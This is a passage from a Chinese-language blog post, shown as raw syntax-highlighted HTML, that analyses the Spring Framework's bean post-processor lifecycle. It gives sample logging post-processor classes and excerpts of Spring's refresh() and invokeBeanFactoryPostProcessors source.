class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MyInstantiationAwareBeanPostProcessor.postProcessAfterInstantiation ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">PropertyValues</span> <span class="token function">postProcessProperties</span><span class="token punctuation">(</span><span class="token class-name">PropertyValues</span> pvs<span class="token punctuation">,</span> <span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MyInstantiationAwareBeanPostProcessor.postProcessProperties ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyMergedBeanDefinitionPostProcessor</span> <span class="token keyword">implements</span> <span class="token class-name">MergedBeanDefinitionPostProcessor</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token class-name">MyMergedBeanDefinitionPostProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MyMergedBeanDefinitionPostProcessor  构造器执行....."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">postProcessBeforeInitialization</span><span class="token punctuation">(</span><span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MyMergedBeanDefinitionPostProcessor.postProcessBeforeInitialization ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">postProcessAfterInitialization</span><span class="token punctuation">(</span><span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MyMergedBeanDefinitionPostProcessor.postProcessAfterInitialization ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">postProcessMergedBeanDefinition</span><span class="token punctuation">(</span><span class="token class-name">RootBeanDefinition</span> beanDefinition<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> beanType<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MyMergedBeanDefinitionPostProcessor.postProcessMergedBeanDefinition ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">resetBeanDefinition</span><span class="token punctuation">(</span><span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MyMergedBeanDefinitionPostProcessor.resetBeanDefinition ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySmartInstantiationAwareBeanPostProcessor</span> <span class="token keyword">implements</span> <span class="token class-name">SmartInstantiationAwareBeanPostProcessor</span> <span class="token punctuation">&#123;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">predictBeanType</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> beanClass<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MySmartInstantiationAwareBeanPostProcessor.predictBeanType ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">determineCandidateConstructors</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> beanClass<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MySmartInstantiationAwareBeanPostProcessor.determineCandidateConstructors ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Constructor</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getEarlyBeanReference</span><span class="token punctuation">(</span><span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MySmartInstantiationAwareBeanPostProcessor.getEarlyBeanReference ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyBeanDefinitionRegistryPostProcessor</span> <span class="token keyword">implements</span> <span class="token class-name">BeanDefinitionRegistryPostProcessor</span> <span class="token punctuation">&#123;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">postProcessBeanFactory</span><span class="token punctuation">(</span><span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MyBeanDefinitionRegistryPostProcessor postProcessBeanFactory ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">postProcessBeanDefinitionRegistry</span><span class="token punctuation">(</span><span class="token class-name">BeanDefinitionRegistry</span> registry<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MyBeanDefinitionRegistryPostProcessor postProcessBeanDefinitionRegistry ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyBeanFactoryPostProcessor</span> <span class="token keyword">implements</span> <span class="token class-name">BeanFactoryPostProcessor</span> <span class="token punctuation">&#123;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">postProcessBeanFactory</span><span class="token punctuation">(</span><span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行 MyBeanFactoryPostProcessor postProcessBeanFactory ....................."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>使用 ComponentScan 来扫描注解@Componment</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"cn.hyqup.spring"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AnnotationMainTest</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">MainConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Cat</span> bean <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">Cat</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>bean<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h1 id="堆栈分析"><a href="#堆栈分析" class="headerlink" title="堆栈分析"></a>堆栈分析</h1><h2 id="类型一：BeanFactoryPostProcessor类型的工厂后置处理器"><a href="#类型一：BeanFactoryPostProcessor类型的工厂后置处理器" class="headerlink" title="类型一：BeanFactoryPostProcessor类型的工厂后置处理器"></a>类型一：BeanFactoryPostProcessor类型的工厂后置处理器</h2><h3 id="BeanFactoryPostProcessor-代码入口"><a href="#BeanFactoryPostProcessor-代码入口" class="headerlink" title="BeanFactoryPostProcessor 代码入口"></a>BeanFactoryPostProcessor 代码入口</h3><h4 id="AnnotationConfigApplicationContext-refresh（）"><a href="#AnnotationConfigApplicationContext-refresh（）" class="headerlink" title="AnnotationConfigApplicationContext refresh（）"></a>AnnotationConfigApplicationContext refresh（）</h4><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">refresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalStateException</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>startupShutdownMonitor<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">StartupStep</span> contextRefresh <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>applicationStartup<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token string">"spring.context.refresh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Prepare this context for refreshing.</span>      <span class="token function">prepareRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Tell the subclass to refresh the internal bean factory.</span>      <span class="token comment">//告诉子类刷新内部 bean 工厂。</span>      <span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory <span class="token operator">=</span> <span class="token function">obtainFreshBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Prepare the bean factory for use in this context.</span>      <span class="token function">prepareBeanFactory</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>         <span class="token comment">// Allows post-processing of the bean factory in context subclasses.</span>         <span class="token function">postProcessBeanFactory</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">StartupStep</span> beanPostProcess <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>applicationStartup<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token string">"spring.context.beans.post-process"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Invoke factory processors registered as beans in the context.</span>         <span class="token comment">// 执行所有的 BeanFactoryPostProcessor，理由BeanFactory后置增强器对工厂进行修改或增强</span>         <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Register bean processors that intercept bean creation.</span>         <span class="token function">registerBeanPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>         beanPostProcess<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Initialize message source for this context.</span>         <span class="token function">initMessageSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Initialize event multicaster for this context.</span>         <span class="token function">initApplicationEventMulticaster</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Initialize other special beans in specific context subclasses.</span>         <span class="token function">onRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Check for listener beans and register them.</span>         <span class="token function">registerListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Instantiate all remaining (non-lazy-init) singletons.</span>         <span class="token comment">// 完成Bean 工厂的初始化</span>         <span class="token function">finishBeanFactoryInitialization</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Last step: publish corresponding event.</span>         <span class="token function">finishRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeansException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isWarnEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            logger<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">"Exception encountered during context initialization - "</span> <span class="token operator">+</span>                  <span class="token string">"cancelling refresh attempt: "</span> <span class="token operator">+</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token comment">// Destroy already created singletons to avoid dangling resources.</span>         <span class="token function">destroyBeans</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Reset 'active' flag.</span>         <span class="token function">cancelRefresh</span><span class="token punctuation">(</span>ex<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Propagate exception to caller.</span>         <span class="token keyword">throw</span> ex<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>         <span class="token comment">// Reset common introspection caches in Spring's core, since we</span>         <span class="token comment">// might not ever need metadata for singleton beans anymore...</span>         <span class="token function">resetCommonCaches</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         contextRefresh<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>invokeBeanFactoryPostProcessors 为BeanFactoryPostProcessors核心入口方法，发生在BeanFactory创建之后</p><h3 id="BeanFactoryPostProcessor注册"><a href="#BeanFactoryPostProcessor注册" class="headerlink" title="BeanFactoryPostProcessor注册"></a>BeanFactoryPostProcessor注册</h3><h4 id="refresh-中的-invokeBeanFactoryPostProcessors-方法就是执行所有BeanFactory-后置增强器"><a href="#refresh-中的-invokeBeanFactoryPostProcessors-方法就是执行所有BeanFactory-后置增强器" class="headerlink" title="refresh() 中的 invokeBeanFactoryPostProcessors 方法就是执行所有BeanFactory 后置增强器"></a>refresh() 中的 invokeBeanFactoryPostProcessors 方法就是执行所有BeanFactory 后置增强器</h4><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span><span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">PostProcessorRegistrationDelegate</span><span class="token punctuation">.</span><span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">,</span> <span class="token function">getBeanFactoryPostProcessors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Detect a LoadTimeWeaver and prepare for weaving, if found in the meantime</span>   <span class="token comment">// (e.g. through an @Bean method registered by ConfigurationClassPostProcessor)</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">NativeDetector</span><span class="token punctuation">.</span><span class="token function">inNativeImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> beanFactory<span class="token punctuation">.</span><span class="token function">getTempClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> beanFactory<span class="token punctuation">.</span><span class="token function">containsBean</span><span class="token punctuation">(</span><span class="token constant">LOAD_TIME_WEAVER_BEAN_NAME</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">addBeanPostProcessor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LoadTimeWeaverAwareProcessor</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">setTempClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ContextTypeMatchClassLoader</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">getBeanClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="BeanFactoryPostProcessor执行"><a href="#BeanFactoryPostProcessor执行" class="headerlink" title="BeanFactoryPostProcessor执行"></a>BeanFactoryPostProcessor执行</h3><h4 id="执行invokeBeanFactoryPostProcessors-核心逻辑"><a href="#执行invokeBeanFactoryPostProcessors-核心逻辑" class="headerlink" title="执行invokeBeanFactoryPostProcessors 核心逻辑"></a>执行invokeBeanFactoryPostProcessors 核心逻辑</h4><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span>      <span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory<span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BeanFactoryPostProcessor</span><span class="token punctuation">></span></span> beanFactoryPostProcessors<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// WARNING: Although it may appear that the body of this method can be easily</span>   <span class="token comment">// refactored to avoid the use of multiple loops and multiple lists, the use</span>   <span class="token comment">// of multiple lists and multiple passes over the names of processors is</span>   <span class="token comment">// intentional. We must ensure that we honor the contracts for PriorityOrdered</span>   <span class="token comment">// and Ordered processors. Specifically, we must NOT cause processors to be</span>   <span class="token comment">// instantiated (via getBean() invocations) or registered in the ApplicationContext</span>   <span class="token comment">// in the wrong order.</span>   <span class="token comment">//</span>   <span class="token comment">// Before submitting a pull request (PR) to change this method, please review the</span>   <span class="token comment">// list of all declined PRs involving changes to PostProcessorRegistrationDelegate</span>   <span class="token comment">// to ensure that your proposal does not result in a breaking change:</span>   <span class="token comment">// https://github.com/spring-projects/spring-framework/issues?q=PostProcessorRegistrationDelegate+is%3Aclosed+label%3A%22status%3A+declined%22</span>   <span class="token comment">// Invoke BeanDefinitionRegistryPostProcessors first, if any.</span>   <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> processedBeans <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>beanFactory <span class="token keyword">instanceof</span> <span class="token class-name">BeanDefinitionRegistry</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">BeanDefinitionRegistry</span> registry <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">BeanDefinitionRegistry</span><span class="token punctuation">)</span> beanFactory<span class="token punctuation">;</span>      <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BeanFactoryPostProcessor</span><span class="token punctuation">></span></span> regularPostProcessors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BeanDefinitionRegistryPostProcessor</span><span class="token punctuation">></span></span> registryProcessors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">BeanFactoryPostProcessor</span> postProcessor <span class="token operator">:</span> beanFactoryPostProcessors<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>postProcessor <span class="token keyword">instanceof</span> <span class="token class-name">BeanDefinitionRegistryPostProcessor</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">BeanDefinitionRegistryPostProcessor</span> registryProcessor <span class="token operator">=</span>                  <span class="token punctuation">(</span><span class="token class-name">BeanDefinitionRegistryPostProcessor</span><span class="token punctuation">)</span> postProcessor<span class="token punctuation">;</span>            registryProcessor<span class="token punctuation">.</span><span class="token function">postProcessBeanDefinitionRegistry</span><span class="token punctuation">(</span>registry<span class="token punctuation">)</span><span class="token punctuation">;</span>            registryProcessors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>registryProcessor<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            regularPostProcessors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>postProcessor<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Do not initialize FactoryBeans here: We need to leave all regular beans</span>      <span class="token comment">// uninitialized to let the bean factory post-processors apply to them!</span>      <span class="token comment">// Separate between BeanDefinitionRegistryPostProcessors that implement</span>      <span class="token comment">// PriorityOrdered, Ordered, and the rest.</span>      <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">BeanDefinitionRegistryPostProcessor</span><span class="token punctuation">></span></span> currentRegistryProcessors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// First, invoke the BeanDefinitionRegistryPostProcessors that implement PriorityOrdered.</span>      <span class="token comment">//首先，调用实现 PriorityOrdered 的 BeanDefinitionRegistryPostProcessor</span>      <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> postProcessorNames <span class="token operator">=</span>            beanFactory<span class="token punctuation">.</span><span class="token function">getBeanNamesForType</span><span class="token punctuation">(</span><span class="token class-name">BeanDefinitionRegistryPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span 